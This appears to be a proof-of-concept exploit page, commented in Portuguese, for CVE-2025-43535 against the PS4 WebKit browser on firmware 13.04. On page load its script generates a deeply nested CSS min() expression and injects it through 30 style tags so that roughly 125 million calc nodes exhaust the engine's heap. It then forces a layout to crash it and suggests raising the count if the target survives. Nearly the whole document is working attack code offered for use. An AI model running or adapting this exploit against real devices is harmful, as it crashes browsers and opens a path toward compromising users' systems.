<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — Chunked Heap Exhaustion</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · Fragmentação de Heap · PS4 FW 13.04</div>
<div id="log"></div>
<div id="stage" style="visibility:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// Constrói a árvore de profundidade N (C22 = ~36MB / ~4.19M de nós)
function buildDepth(depth) {
  let e = '1px';
  for (let d = 1; d <= depth; d++) {
    e = 'min(' + e + ',' + e + ')';
  }
  return e;
}

// Respiro para não travar a UI durante o loop
const yieldGC = () => new Promise(r => setTimeout(r, 100));

async function run() {
  L('Iniciando Tática de Fragmentação (Style Chunking)...', 'warn');

  // 1. Gera o bloco C22. Como você mapeou, o pico do JS ficará super baixo.
  L('Construindo o bloco base C22 no JS...', 'info');
  let c22;
  try {
    c22 = buildDepth(22);
    L(`Bloco C22 gerado. Tamanho no JS: ~36MB.`, 'ok');
  } catch(e) {
    L('Erro ao gerar C22: ' + e, 'fail');
    return;
  }

  // 30 tags * 4.19M nós = 125.7M de nós (Acima dos 119.5M do seu limite)
  const totalTags = 30;

  L(`Injetando ${totalTags} tags <style> separadas...`, 'warn');
  L(`Alvo: Acumular ~125 Milhões de objetos CSSCalcValue.`, 'info');

  for (let i = 1; i <= totalTags; i++) {
    try {
      const style = document.createElement('style');
      // Cada tag cria uma classe diferente para o C++ não otimizar e agrupar
      style.textContent = `.t${i} { width: ${c22} }`;
      document.head.appendChild(style);
      
      L(`[${i}/${totalTags}] Tag <style> anexada (+36MB no Heap C++).`, 'ok');
      
      // Instancia a classe no DOM para forçar a engine a criar os nós matemáticos
      const el = document.createElement('div');
      el.className = `t${i}`;
      document.getElementById('stage').appendChild(el);

      // Pausa a cada 5 tags para permitir que o WebKit processe os nós
      if (i % 5 === 0) await yieldGC();
      
    } catch(e) {
      L(`Erro na injeção ${i}: ${e}`, 'fail');
    }
  }

  L('Todas as 30 tags foram injetadas!', 'warn');
  L('Deletando string do JS para garantir máxima RAM livre pro kernel...', 'info');
  c22 = null; 
  await yieldGC();

  L('Forçando recálculo global para ativar o gatilho final...', 'crash');
  setTimeout(() => {
    try {
      void document.body.offsetWidth;
      L('Sobreviveu. Tente aumentar o número totalTags para 32 ou 35.', 'fail');
    } catch(e) {
      L('Erro no layout: ' + e, 'fail');
    }
  }, 500);
}

window.addEventListener('load', () => setTimeout(run, 500));
</script>
</body>
</html>
